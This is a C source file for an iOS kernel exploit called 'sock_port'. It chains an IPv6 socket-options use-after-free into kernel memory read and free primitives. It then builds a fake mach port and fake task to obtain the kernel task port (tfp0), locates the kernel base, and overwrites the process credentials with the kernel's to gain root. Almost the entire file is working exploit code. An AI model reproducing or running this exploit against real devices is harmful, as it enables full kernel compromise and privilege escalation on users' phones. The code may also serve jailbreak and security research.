//
//  exploit.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#include "exploit.h"
#include "kernel_memory.h"
#include "OffsetHolder.h"
#include "ImportantHolders.h"
#include "KernelUtils.h"
#include "PFOffs.h"
//#include "utilsZS.h"
#include "find_port.h"
// utilities to manipulate sockets
uint64_t find_port(mach_port_name_t port, uint64_t task_self) {
    uint64_t task_addr = ReadKernel64(task_self + 0x68);
    uint64_t itk_space = ReadKernel64(task_addr + 0x300);
    
    uint64_t is_table = ReadKernel64(itk_space + 0x20);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    
    return port_addr;
}

int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int set_prefertempaddr(int sock, int *prefertempaddr) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
int get_socket() {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        util_error("[-] Can't get socket, error %d (%s)", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        util_error("[-] setsockopt() failed, error %d (%s)", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}

// return a socket ready for UAF
int get_socket_with_dangling_options() {
    int socket = get_socket();
    
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    
    free_socket_options(socket);
    
    return socket;
}

mach_port_t new_port() {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        util_error("[-] Failed to allocate port (%s)", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        util_error("[-] Failed to insert right (%s)", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();
    
    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointer_OG(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         |-----------||-----------|
         minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        
        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}

// function to cache our task port kernel address
uint64_t task_self_addr2() {
    static uint64_t cached_task_self_addr = 0;
    if (cached_task_self_addr) return cached_task_self_addr;
    else return find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface_OG((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        util_error("[-] Failed to read kernel");
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}

uint64_t rk64_via_uaf(uint64_t addr) {
    void *buf = read_20_via_uaf(addr);
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

// third primitive: free a kalloced object at an arbitrary address
int free_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface_OG((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        util_error("[-] failed to setup freeing primitive");
        return -1;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));
    
    int ret = set_pktinfo(sockets[found_at], buf);
    free(buf);
    return ret;
}


static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags_OG waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

uint64_t self_port_addr;
mach_port_t get_tfp0() {
youknowtryagain:
    util_info("[!] exploit started!");
    
    kern_return_t ret = init_IOSurface_OG();
    if (ret) {
        util_error("[-] can't init IOSurface!");
        return MACH_PORT_NULL;
    }
    util_info("[+] initialized IOSurface");
    
   /* ret = init_offsets_TW();
    if (ret) {
        util_error("[-] iOS version not supported");
        goto err;
    }
    util_info("Initialized offsets");
    */
    
    bool SMAP = false;
    if (pagesize_OG == 0x4000) {
        struct utsname a;
        uname(&a);
        if (!strstr(a.machine, "iPad5,") && !strstr(a.machine, "iPad6,") && !strstr(a.machine, "iPhone8,")) {
            util_info("[i] detected SMAP device");
            SMAP = true;
        }
    }
    
    self_port_addr = task_self_addr2(); // port leak primitive
    set_task_self_addr(task_self_addr2());
    if (!self_port_addr) {
        util_error("[-] failed to leak our task port address!");
        
        goto err;
    }
    
    util_info("[i] our task port: 0x%llx", self_port_addr);
    
    // kernel read primitive
    uint64_t ipc_space_kernel = rk64_via_uaf(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space_kernel) {
        util_error("[-] kernel read primitive failed!");
        goto err;
    }
    util_info("[i] ipc_space_kernel: 0x%llx", ipc_space_kernel);
    
    // here we'll create a pair of pipes (4 file descriptors in total)
    // first pipe, used to overwrite a port pointer in a mach message
    int fds[2];
    ret = pipe(fds);
    if (ret) {
        util_error("[-] failed to create pipe");
        goto err;
    }
    
    // make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to kalloc.512
    uint8_t pipebuf[0x10000];
    memset(pipebuf, 0, 0x10000);
    
    write(fds[1], pipebuf, 0x10000); // do write() to allocate the buffer on the kernel
    read(fds[0], pipebuf, 0x10000); // do read() to reset buffer position
    write(fds[1], pipebuf, 8); // write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)
    
    // second pipe, used for our fake port
    int port_fds[2] = {-1, -1};
    if (SMAP) {
        ret = pipe(port_fds);
        if (ret) {
            util_error("[-] failed to create pipe");
            goto err;
        }
    }
    
    // create fake port and fake task, put fake_task right after fakeport
    kport_t_OG *fakeport = malloc(sizeof(kport_t_OG) + 0x600);
    ktask_t_OG *fake_task = (ktask_t_OG *)((uint64_t)fakeport + sizeof(kport_t_OG));
    bzero((void *)fakeport, sizeof(kport_t_OG) + 0x600);
    
    fake_task->ref_count_OG = 0xff;
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock_OG.type = 0x11;
    fakeport->ip_messages_OG.port_OG.receiver_name = 1;
    fakeport->ip_messages_OG.port_OG.msgcount = 0;
    fakeport->ip_messages_OG.port_OG.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages_OG.port_OG.waitq_OG.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = 0;
    fakeport->ip_receiver = ipc_space_kernel;
    
    if (SMAP) {
        write(port_fds[1], (void *)fakeport, sizeof(kport_t_OG) + 0x600);
        read(port_fds[0], (void *)fakeport, sizeof(kport_t_OG) + 0x600);
    }
    
    // find the pipe buffers for both pipes
    
#define rk64_check(addr) ({ uint64_t r; r = rk64_via_uaf(addr); if (!r) { printf("[-] failed to read from '"#addr"'\n"); goto err; }; r;})
    
    uint64_t task = rk64_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    //uint32_t tmpval = 0x100;
    uint64_t proc = rk64_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    uint64_t p_fd = rk64_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    uint64_t fd_ofiles = rk64_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    
    uint64_t fproc = rk64_check(fd_ofiles + fds[0] * 8);
    uint64_t f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    uint64_t fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    uint64_t pipe_buffer = rk64_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    util_info("[*] pipe buffer: 0x%llx", pipe_buffer);
    
    uint64_t port_fg_data = 0;
    uint64_t port_pipe_buffer = 0;
    
    if (SMAP) {
        fproc = rk64_check(fd_ofiles + port_fds[0] * 8);
        f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
        port_fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
        port_pipe_buffer = rk64_check(port_fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
        util_info("[*] second pipe buffer: 0x%llx", port_pipe_buffer);
    }
    
    if (SMAP) {
        // align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)
        fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t_OG);
    }
    else {
        fakeport->ip_kobject = (uint64_t)fake_task;
    }
    
    if (SMAP) {
        // update our pipe buffer
        write(port_fds[1], (void *)fakeport, sizeof(kport_t_OG) + 0x600);
    }
    
    // create a new port, this one we'll use for tfp0
    mach_port_t target = new_port();
    if (!target) {
        util_error("[-] failed to allocate port");
        goto err;
    }
    
    // get its kernel address
    uint64_t target_addr = find_port_via_uaf(target, MACH_MSG_TYPE_COPY_SEND);
    if (!target_addr) {
        util_error("[-] failed to leak target port address");
        goto err;
    }
    
    // free the first pipe buffer
    ret = free_via_uaf(pipe_buffer);
    if (ret) {
        util_error("[-] failed to free pipe buffer");
        goto err;
    }
    
    // reallocate it while filling it with a mach message containing send rights to our target port
    mach_port_t p = MACH_PORT_NULL;
    for (int i = 0; i < 10000; i++) {
        
        // pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later
        p = fill_kalloc_with_port_pointer_OG(target, 0x10000/8, MACH_MSG_TYPE_COPY_SEND);
        
        // check if spraying worked by reading first 8 bytes
        uint64_t addr;
        read(fds[0], &addr, 8);
        if (addr == target_addr) { // if we see the address of our port, it worked
            break;
        }
        write(fds[1], &addr, 8); // reset buffer position
        
        mach_port_destroy(mach_task_self(), p); // spraying didn't work, so free port
        p = MACH_PORT_NULL;
    }
    
    if (!p) {
        util_error("[-] spraying failed!");
        goto err;
    }
    
    if (SMAP) {
        // spraying worked, now the pipe buffer is filled with pointers to our target port
        // overwrite the first pointer with our second pipe buffer, which contains the fake port
        write(fds[1], &port_pipe_buffer, 8);
    }
    else {
        write(fds[1], &fakeport, 8);
    }
    
    // receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!
    struct ool_msg_OG *msg = malloc(0x1000);
    ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        free(msg);
        util_error("[-] mach_msg() failed: %d (%s)", ret, mach_error_string(ret));
        goto err;
    }
    
    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t our_port = received_ports[0]; // fake port!
    free(msg);
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#define kr32(addr, value)\
if (SMAP) {\
read(port_fds[0], (void *)fakeport, sizeof(kport_t_OG) + 0x600);\
}\
*read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
if (SMAP) {\
write(port_fds[1], (void *)fakeport, sizeof(kport_t_OG) + 0x600);\
}\
value = 0x0;\
ret = pid_for_task(our_port, (int *)&value);
    
    uint32_t read64_tmp;
#define kr64(addr, value)\
kr32(addr + 0x4, read64_tmp);\
kr32(addr, value);\
value = value | ((uint64_t)read64_tmp << 32)
    
    uint64_t struct_task;
    kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    if (!struct_task) {
        util_error("[-] kernel read failed!");
        goto err;
    }
    
    util_info("[!] READING VIA FAKE PORT WORKED? 0x%llx", struct_task);
    
    util_info("[+] Let's steal that kernel task port!");
    
    // tfp0!
    if (struct_task == 0xffffffffffffffff) {
        goto err;
    }
    uint64_t kernel_vm_map = 0;
    uint32_t ourcurrentpid = getpid();
    uint32_t pid = 0;
    while (struct_task != 0) {
        uint64_t bsd_info;
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        if (!bsd_info) {
            util_error("[-] kernel read failed!");
            goto err;
        }
        
       kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);

        if (pid == ourcurrentpid) {
            kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
            if (!bsd_info) {
                util_error("[-] kernel read failed!");
                goto err;
            }
            //SETOFFSET(kernel_task, struct_task);

            our_procStruct_addr_exported = bsd_info;
            our_task_addr_exportedBYTW = struct_task;
        }
        
        
       // set_selfproc(our_port_addr_exportedBYTW);
        //set_task_self_addr(our_task_addr_exportedBYTW);

        
//        kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);
        
        if (pid == 0) {
            uint64_t vm_map;
            kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
            if (!vm_map) {
                util_error("[-] kernel read failed!");
                goto err;
            }
            our_kernel_procStruct_exportAstylez = bsd_info;
            util_info("our kernel Proc_structure addr: 0x%llx", our_kernel_procStruct_exportAstylez);
            
            //our_kernel_taskStruct_exportAstylez = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_PROC_TASK));
            //util_info("our kernel task addr: 0x%llx", our_kernel_taskStruct_exportAstylez);
            //SETOFFSET(kernel_task, our_kernel_taskStruct_exportAstylez);

            
            SETOFFSET(kernel_task, struct_task);

            kernel_vm_map = vm_map;
            break;
        }
        
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);
    }
    
    if (!kernel_vm_map) {
        util_error("[-] failed to find kernel's vm_map");
        goto err;
    }
    
    util_info("[i] kernel_vm_map: 0x%llx", kernel_vm_map);
    
    read(port_fds[0], (void *)fakeport, sizeof(kport_t_OG) + 0x600);
    
    fake_task->lock_OG.data = 0x0;
    fake_task->lock_OG.type = 0x22;
    fake_task->ref_count_OG = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
    
    if (SMAP) {
        write(port_fds[1], (void *)fakeport, sizeof(kport_t_OG) + 0x600);
    }
    
    set_tfp0(our_port);
    
    uint64_t addr = kmem_alloc(8);
    if (!addr) {
        util_error("[-] seems like tfp0 port didn't work?");
        goto err;
    }
    
    util_info("[*] allocated: 0x%llx", addr);
    WriteKernel64(addr, 0x4141414141414141);
    uint64_t readb = ReadKernel64(addr);
    kmem_free(addr, 8);
    util_info("[*] read back: 0x%llx", readb);
    
    if (readb != 0x4141414141414141) {
        util_error("[-] read back value didn't match");
        goto err;
    }
    
    util_info("[*] creating safer port");
    
    mach_port_t new_tfp0 = new_port();
    if (!new_tfp0) {
        util_error("[-] failed to allocate new tfp0 port");
        goto err;
    }
    
    uint64_t new_addr = find_port(new_tfp0, self_port_addr);
    if (!new_addr) {
        util_error("[-] failed to find new tfp0 port address");
        goto err;
    }
    
    uint64_t faketask = kmem_alloc(0x600);
    if (!faketask) {
        util_error("[-] failed to kalloc faketask");
        goto err;
    }
    
    kwriteOwO(faketask, fake_task, 0x600);
    fakeport->ip_kobject = faketask;
    
    kwriteOwO(new_addr, (const void*)fakeport, sizeof(kport_t_OG));
    
    util_info("[*] testing new tfp0 port");
    
    set_tfp0(new_tfp0);
    
    
    addr = kmem_alloc(8);
    if (!addr) {
        util_error("[-] seems like the new tfp0 port didn't work?");
        goto err;
    }
    
    util_info("[+] tfp0: 0x%x", new_tfp0);
    util_info("[*] allocated: 0x%llx", addr);
    WriteKernel64(addr, 0x4141414141414141);
    readb = ReadKernel64(addr);
    kmem_free(addr, 8);
    util_info("[*] read back: 0x%llx", readb);
    
    if (readb != 0x4141414141414141) {
        util_error("[-] read back value didn't match");
        goto err;
    }
    // clean up port
    uint64_t task_addr = ReadKernel64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    //Techincally
    uint64_t task_xd = ReadKernel64(itk_space + 0x28);
    uint64_t selfproc = ReadKernel64(task_xd + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    set_selfproc(selfproc);
    
    //init_kernel_memorytw(new_tfp0, self_port_addr);
    //tfp0_exportedBYTW = new_tfp0;
    our_port_addr_exportedBYTW = self_port_addr;
    our_task_addr_exportedBYTW = task_addr;
    
    uint32_t port_index = our_port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    WriteKernel64(is_table + (port_index * sizeof_ipc_entry_t), 0);
    
    WriteKernel64(fg_data + 16, 0); // freed already via mach_msg()
    
    if (fds[0] > 0)  close(fds[0]);
    if (fds[1] > 0)  close(fds[1]);
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    
    free((void *)fakeport);

    
     // ----------- find kernel base ----------- //
     uint64_t kernel_base = 0;

     uint64_t IOSurface_port_addr = find_port_address_sockpuppet(IOSurfaceRootUserClient_OG, mach_task_self());
     uint64_t IOSurface_object = ReadKernel64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     uint64_t vtable = ReadKernel64(IOSurface_object);
     vtable |= 0xffffff8000000000; // in case it has PAC
     uint64_t function = ReadKernel64(vtable + 8 * koffset(OFFSET_GETFI));
     function |= 0xffffff8000000000; // this address is inside the kernel image
     uint64_t page = trunc_page_kernel(function);
    
     while (true) {
         if (ReadKernel64(page) == 0x0100000cfeedfacf && (ReadKernel64(page + 8) == 0x0000000200000000 || ReadKernel64(page + 8) == 0x0000000200000002)) {
             kernel_base = page;
             deinit_IOSurface();
             break;
         }
         page -= pagesize_OG;
     }
     
     util_info("Kernel base: 0x%llx", kernel_base);
     kernelbase_exportedBYTW = kernel_base;


    
    
    
    uint64_t orig_ucred = ReadKernel64(our_procStruct_addr_exported + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    if (orig_ucred == 0x0)
    {
        util_error("failed to get orig_ucred!");
        ret = KERN_FAILURE;
        goto err;
    }
    util_info("orig_ucred: 0x%llx", orig_ucred);
    
    uint64_t kern_ucred = ReadKernel64(our_kernel_procStruct_exportAstylez + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    if (kern_ucred == 0x0)
    {
        util_error("failed to get kern_ucred!");
        ret = KERN_FAILURE;
        goto err;
    }
    util_info("kern_ucred: 0x%llx", kern_ucred);
    
    WriteKernel64(our_procStruct_addr_exported + koffset(KSTRUCT_OFFSET_PROC_UCRED), kern_ucred);
    
    util_info("setuid: %d, uid: %d", setuid(0), getuid());
    if (getuid() != 0)
    {
        util_error("failed to elevate to root/kernel creds!");
        ret = KERN_FAILURE;
        goto err;
    }
    
    
    return new_tfp0;
    
err:
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    
    deinit_IOSurface();
   // goto youknowtryagain;
    return MACH_PORT_NULL;
}
